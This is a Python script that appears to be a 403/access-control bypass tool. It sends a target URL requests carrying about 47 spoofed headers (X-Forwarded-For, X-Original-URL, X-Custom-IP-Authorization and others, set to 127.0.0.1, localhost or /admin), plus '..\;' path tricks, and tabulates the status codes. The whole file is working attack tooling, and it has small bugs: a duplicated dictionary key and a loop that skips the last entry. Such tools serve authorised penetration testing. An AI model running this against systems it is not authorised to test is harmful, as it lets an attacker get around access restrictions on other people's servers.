from typing import Counter
import requests
from prettytable import PrettyTable
hpayload = {
1:"X-Custom-IP-Authorization|127.0.0.1\{payload}",
2:"Referer|{payload}\{payload}",
3:"X-Forwarded-Host|127.0.0.1\{payload}",
4:"X-Host|127.0.0.1\{payload}",
5:"X-Client-IP|127.0.0.1\{payload}",
6:"X-Remote-IP|127.0.0.1\{payload}",     
7:"X-Forwarded-For|127.0.0.1\{payload}",
8:"X-Originating-IP|127.0.0.1\{payload}",
9:"X-Rewrite-URL|/{uri}\{payload}",
10:"X-Original-URL|/{uri}\{payload}",
11:'Client-IP|127.0.0.1',
12:'Forwarded-For-Ip|127.0.0.1',
13:'Forwarded-For|127.0.0.1',
14:'Forwarded-For|localhost',
15:'Forwarded|127.0.0.1',
16:'Forwarded|localhost',
17:'True-Client-IP|127.0.0.1',
18:'X-Client-IP|127.0.0.1',
19:'X-Custom-IP-Authorization|127.0.0.1',
20:'X-Forward-For|127.0.0.1',
21:'X-Wap-Profile|localhost',
22:'X-Forward|127.0.0.1',
23:'X-Forward|localhost',
24:'X-Forwarded-By|127.0.0.1',
25:'X-Forwarded-By|localhost',
26:'X-Forwarded-For-Original|127.0.0.1',
27:'X-Forwarded-For-Original|localhost',
28:'X-Forwarded-For|127.0.0.1',
29:'X-Forwarded-For|localhost',
20:'X-Forwarded-Server|127.0.0.1',
30:'X-Forwarded-Server|localhost',
31:'X-Forwarded|127.0.0.1',
32:'X-Forwarded|localhost',
33:'X-Forwared-Host|127.0.0.1',
34:'X-Forwared-Host|localhost',
35:'X-Host|127.0.0.1',
36:'X-Host|localhost',
37:'X-HTTP-Host-Override|127.0.0.1',
38:'X-Originating-IP|127.0.0.1',
39:'X-Real-IP|127.0.0.1',
40:'X-Remote-Addr|127.0.0.1',
41:'X-Remote-Addr|localhost',
42:'X-Remote-IP|127.0.0.1',
43:'X-Original-URL|/admin',
44:'X-Override-URL|/admin',
45:'X-Rewrite-URL|/admin',
46:'Referer|/admin',
47:'X-HTTP-Method-Override|PUT' # change get to post
}

counter=0

headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/93.0.4577.63 Safari/537.36"}


def init_header(target):
    
    t= PrettyTable(["Status","Header","Value"])
    bar_count = target.count("/")
    if target.endswith("/"):
	    bar_count = bar_count -1

    if bar_count == 2:
	    url = target
	    uri = ""
    else:
	    aux =  target.split("/")
	    url = "/".join(aux[:bar_count])
	    uri = aux[bar_count]

    
    def setpayload(i):
        if i in [1,2]:
            return url+"/"+uri+"..\;"
        elif i in [9,10]:
            return url+"/"+uri
        else:
            return url+"/"

    

    def runthing(i,payload):
        global counter
        if i in [9,10]:
            head=hpayload[i].format(uri=uri,payload=payload)
        elif i in range(1,9):
            head=hpayload[i].format(payload=payload)
        else:
            head=hpayload[i]
        head=head.split('|')
        headers[head[0]] = head[1]
        re = requests.get(url=target,headers=headers,timeout=60)
        counter +=1
        print("  Header injection Payload count {}".format(counter),end="\r")
        t.add_row([re.status_code,head[0],head[1]])
        headers.popitem()

        
    for i in range(1,47):
        runthing(i,setpayload(i))

    print(t)
   
